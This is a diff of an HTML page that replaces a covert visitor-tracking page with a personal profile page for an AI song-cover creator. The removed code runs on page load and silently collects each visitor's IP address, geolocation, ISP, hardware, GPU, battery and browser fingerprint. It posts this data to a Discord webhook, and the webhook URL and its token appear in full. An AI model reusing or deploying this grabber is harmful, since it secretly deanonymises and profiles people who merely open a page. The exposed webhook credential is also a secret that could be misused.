@@ -1,149 +1,171 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Device Info Collector</title>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/fingerprintjs2/2.1.0/fingerprint2.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.7.2/axios.min.js"></script>
-</head>
-<body>
-  <script>
-    async function collectDeviceInfo() {
-      try {
-        // Initialize data object
-        const deviceInfo = {
-          ip_address: '',
-          location: { city: '', region: '', country: '' },
-          network: { isp: '', timezone: '', connection: { type: '', downlink: '' } },
-          system: { type: '', platform: '', cpu_threads: 0, ram: '' },
-          display: { resolution: '', window: '', touch: false, orientation: '' },
-          gpu: { renderer: '', vendor: '' },
-          browser: { name: '', engine: '', language: '', cookies: false, java: false, dnt: '' },
-          preferences: { theme: '', battery: '', adblock: false, fonts_loaded: 0 },
-          fingerprint: '',
-          page_title: document.title,
-          time_of_visit: new Date().toString()
-        };
-
-        // Fetch IP and location data
-        try {
-          const ipResponse = await axios.get('https://api.ipify.org?format=json');
-          deviceInfo.ip_address = ipResponse.data.ip;
-
-          const geoResponse = await axios.get(`https://ipapi.co/${deviceInfo.ip_address}/json/`);
-          const geoData = geoResponse.data;
-          deviceInfo.location = {
-            city: geoData.city || 'Unknown',
-            region: geoData.region || 'Unknown',
-            country: geoData.country_name || 'Unknown'
-          };
-          deviceInfo.network.isp = geoData.org || 'Unknown';
-          deviceInfo.network.timezone = geoData.timezone || 'Unknown';
-        } catch (error) {
-          console.error('Error fetching IP/location:', error);
-        }
-
-        // Network connection
-        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
-        deviceInfo.network.connection = {
-          type: connection.effectiveType || 'Unknown',
-          downlink: connection.downlink ? `${connection.downlink}Mbps` : 'Unknown'
-        };
-
-        // System info
-        deviceInfo.system = {
-          type: /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
-          platform: navigator.platform || 'Unknown',
-          cpu_threads: navigator.hardwareConcurrency || 0,
-          ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown'
-        };
-
-        // Display and GPU
-        deviceInfo.display = {
-          resolution: `${screen.width}x${screen.height} @ ${screen.colorDepth}bit`,
-          window: `${window.innerWidth}x${window.innerHeight}`,
-          touch: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
-          orientation: screen.orientation ? screen.orientation.type : 'Unknown'
-        };
-
-        const gl = document.createElement('canvas').getContext('webgl');
-        if (gl) {
-          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-          deviceInfo.gpu = {
-            renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown',
-            vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown'
-          };
-        }
-
-        // Browser info
-        const ua = navigator.userAgent;
-        deviceInfo.browser = {
-          name: /Chrome/i.test(ua) ? 'Chrome' : /Firefox/i.test(ua) ? 'Firefox' : /Safari/i.test(ua) ? 'Safari' : 'Unknown',
-          engine: /WebKit/i.test(ua) ? 'WebKit' : /Gecko/i.test(ua) ? 'Gecko' : 'Unknown',
-          language: navigator.language || 'Unknown',
-          cookies: navigator.cookieEnabled || false,
-          java: navigator.javaEnabled ? navigator.javaEnabled() : false,
-          dnt: navigator.doNotTrack || 'Unknown'
-        };
-
-        // Preferences
-        deviceInfo.preferences = {
-          theme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Dark' : 'Light',
-          battery: await navigator.getBattery?.().then(b => `${Math.round(b.level * 100)}%`) || 'Unknown',
-          adblock: await detectAdBlock(),
-          fonts_loaded: (window.document.fonts?.size || 0)
-        };
-
-        // Fingerprint
-        new Fingerprint2().get(result => {
-          deviceInfo.fingerprint = result;
-          sendToWebhook(deviceInfo);
-        });
-
-        async function detectAdBlock() {
-          try {
-            const response = await fetch('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js', { method: 'HEAD', mode: 'no-cors' });
-            return false;
-          } catch {
-            return true;
-          }
-        }
-
-        function sendToWebhook(data) {
-          const webhookUrl = 'https://discord.com/api/webhooks/1377030077958586368/wMAt8ome14duC2FdYtNqbbpMGxYc12b8pfUTEK07hTUamreQVhJAcA2GwmxDv_RIz0L3'; // Replace with your Discord webhook URL
-          const embed = {
-            title: 'Device Information',
-            color: 0x00ff00,
-            fields: [
-              { name: 'IP Address', value: data.ip_address, inline: true },
-              { name: 'Location', value: `**City**: ${data.location.city}\n**Region**: ${data.location.region}\n**Country**: ${data.location.country}`, inline: true },
-              { name: 'Network', value: `**ISP**: ${data.network.isp}\n**Timezone**: ${data.network.timezone}\n**Connection**: ${data.network.connection.type}, ${data.network.connection.downlink}`, inline: true },
-              { name: 'System', value: `**Type**: ${data.system.type}\n**Platform**: ${data.system.platform}\n**CPU Threads**: ${data.system.cpu_threads}\n**RAM**: ${data.system.ram}`, inline: true },
-              { name: 'Display & GPU', value: `**Resolution**: ${data.display.resolution}\n**Window**: ${data.display.window}\n**Touch**: ${data.display.touch ? 'Yes' : 'No'}\n**Orientation**: ${data.display.orientation}`, inline: true },
-              { name: 'GPU Details', value: `**Renderer**: ${data.gpu.renderer}\n**Vendor**: ${data.gpu.vendor}`, inline: true },
-              { name: 'Browser', value: `**Browser**: ${data.browser.name}\n**Engine**: ${data.browser.engine}\n**Language**: ${data.browser.language}\n**Cookies**: ${data.browser.cookies ? 'Yes' : 'No'}\n**Java**: ${data.browser.java ? 'Yes' : 'No'}\n**DNT**: ${data.browser.dnt}`, inline: true },
-              { name: 'Preferences', value: `**Theme**: ${data.preferences.theme}\n**Battery**: ${data.preferences.battery}\n**AdBlock**: ${data.preferences.adblock ? 'Yes' : 'No'}\n**Fonts Loaded**: ${data.preferences.fonts_loaded}`, inline: true },
-              { name: 'Fingerprint', value: `\`${data.fingerprint}\``, inline: false },
-              { name: 'Page Title', value: data.page_title, inline: true },
-              { name: 'Time of Visit', value: data.time_of_visit, inline: true }
-            ],
-            timestamp: new Date().toISOString()
-          };
-
-          axios.post(webhookUrl, {
-            embeds: [embed]
-          })
-            .then(response => console.log('Data sent to Discord webhook:', response))
-            .catch(error => console.error('Error sending to Discord webhook:', error));
-        }
-      } catch (error) {
-        console.error('Error collecting device info:', error);
-      }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <!-- Open Graph Meta Tags for a Fire Embed -->
+  <meta property="og:title" content="Koros's Epic Profile" />
+  <meta property="og:description" content="Yo, I’m Koros, obsessed with AI and making killer AI song covers! Hit me up on Discord (@c.oros) for a free custom cover!" />
+  <meta property="og:image" content="https://tse4.mm.bing.net/th/id/OIP.nEpX8STVc2ybq2UYqFupnQHaHT?r=0&rs=1&pid=ImgDetMain&o=7&rm=3" />
+  <meta property="og:url" content="https://koros-cool-site.com/profile" />
+  <meta property="og:type" content="website" />
+  <title>Koros's Profile</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Inter', sans-serif;
+      background: url('https://i.imgur.com/TILaPKD.jpeg') no-repeat center center fixed;
+      background-size: cover;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
 
-    // Run on page load
-    window.onload = collectDeviceInfo;
-  </script>
+    .profile-container {
+      background: rgba(0, 0, 0, 0.7);
+      border: 1px solid white;
+      border-radius: 8px;
+      width: 420px;
+      padding: 20px;
+      color: white;
+      box-shadow: 0 0 10px #000;
+    }
+
+    .avatar {
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      margin: 0 auto;
+      display: block;
+    }
+
+    .name {
+      font-size: 1.5em;
+      font-weight: bold;
+      margin-top: 10px;
+      text-align: center;
+    }
+
+    .bio {
+      text-align: center;
+      margin-top: 5px;
+      font-size: 0.95em;
+    }
+
+    .socials {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      margin-top: 15px;
+    }
+
+    .socials a {
+      width: 36px;
+      height: 36px;
+      border: 1px solid white;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 18px;
+      text-decoration: none;
+    }
+
+    .divider {
+      margin: 15px 0;
+      border-top: 1px solid white;
+    }
+
+    .user-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background-color: rgba(255, 255, 255, 0.05);
+      padding: 10px;
+      border-radius: 5px;
+    }
+
+    .user-info {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .user-info img {
+      width: 40px;
+      height: 40px;
+      border-radius: 5px;
+    }
+
+    .user-info .status {
+      width: 8px;
+      height: 8px;
+      background-color: orange;
+      border-radius: 50%;
+      margin-left: -10px;
+      margin-top: 25px;
+    }
+
+    .user-info span {
+      font-weight: bold;
+    }
+
+    .music-player {
+      background-color: rgba(255, 255, 255, 0.05);
+      margin-top: 15px;
+      border-radius: 5px;
+      padding: 12px;
+    }
+
+    .music-player-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-size: 0.95em;
+    }
+
+    .audio-player {
+      width: 100%;
+      margin-top: 8px;
+    }
+  </style>
+</head>
+<body>
+  <div class="profile-container">
+    <img class="avatar" src="https://tse4.mm.bing.net/th/id/OIP.nEpX8STVc2ybq2UYqFupnQHaHT?r=0&rs=1&pid=ImgDetMain&o=7&rm=3" alt="Avatar">
+    <div class="name">Koros</div>
+    <div class="bio">I love ai, especially making ai song covers! (dm me on discord if u want ur own ai cover for free!)</div>
+
+    <div class="socials">
+      <a href="https://www.youtube.com/@wisdnn" title="YouTube">▶</a>
+      <a href="https://korosiskewl.github.io/rblxtools/" title="roblox tool!">⏺</a>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="user-row">
+      <div class="user-info">
+        <img src="https://tse4.mm.bing.net/th/id/OIP.nEpX8STVc2ybq2UYqFupnQHaHT?r=0&rs=1&pid=ImgDetMain&o=7&rm=3" alt="User">
+        <div class="status"></div>
+        <span>discord: @c.oros</span>
+      </div>
+    </div>
+
+    <div class="music-player">
+      <div class="music-player-header">
+        <span>🔊</span>
+        <span>Marino - Devil In Disguise (Caseoh Ver) THIS IS MY AI COVER, IF YOU SEE IT ANYWHERE ELSE PLEASE TELL ME ON DISCORD! c.oros</span>
+        <span>▶</span>
+      </div>
+      <audio class="audio-player" controls>
+        <source src="Marino - Devil In Disguise Official Lyric Video (Caseoh Ver).mp3" type="audio/mpeg">
+        Your browser does not support the audio element.
+      </audio>
+    </div>
+  </div>
 </body>
 </html>
